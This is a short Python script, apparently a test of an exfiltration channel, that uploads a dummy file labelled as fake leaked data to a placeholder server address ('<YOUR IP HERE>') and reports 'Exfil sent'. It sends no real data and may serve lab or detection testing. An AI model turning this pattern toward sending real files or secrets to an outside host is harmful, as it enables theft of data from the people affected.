
import requests

SERVER = SERVER = "http://<YOUR IP HERE>"
 

files = {'file': ('dummy.txt', 'this is fake leaked data for testing')} 
try:
    r = requests.post(SERVER, files=files, timeout=5)
    print("Exfil sent, status:", r.status_code)
except Exception as e:
    print("Error:", e)

